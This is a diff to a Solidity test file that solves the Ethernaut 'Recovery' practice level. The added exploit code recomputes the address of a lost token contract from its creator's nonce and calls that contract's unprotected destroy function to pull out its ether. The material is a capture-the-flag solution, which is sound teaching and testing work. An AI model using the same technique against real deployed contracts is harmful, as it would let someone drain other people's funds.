@@ -8,6 +8,10 @@ import "../src/metrics/Statistics.sol";
 import "../src/levels/RecoveryFactory.sol";
 import "../src/levels/Recovery.sol";
 
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
 contract RecoveryTest is Test {
     using stdStorage for StdStorage;
 
@@ -36,11 +40,12 @@ contract RecoveryTest is Test {
 
         // Set caller to custom address
         vm.startPrank(eoa);
+        vm.deal(eoa, 1 ether);
 
         // Start recording logs to capture new level instance address
         vm.recordLogs();
         // Create new level instance via Ethernaut
-        ethernaut.createLevelInstance(recoveryFactory);
+        ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
 
         // Parse emitted logs
         Vm.Log[] memory entries = vm.getRecordedLogs();
@@ -61,6 +66,17 @@ contract RecoveryTest is Test {
         Recovery instance = Recovery(payable(instanceAddress));
 
         /* Level Hack */
+        // Address of the newly created token contract by the Recovery contract can be calculated with nonce 1
+        address tokenAddress = computeCreateAddress(address(instance), 1);
+        emit log_named_address("tokenAddress", tokenAddress);
+
+        uint256 balance = address(tokenAddress).balance;
+        emit log_named_uint("balance", balance);
+
+        ISimpleToken(tokenAddress).destroy(payable(eoa));
+
+        balance = address(tokenAddress).balance;
+        emit log_named_uint("balance", balance);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
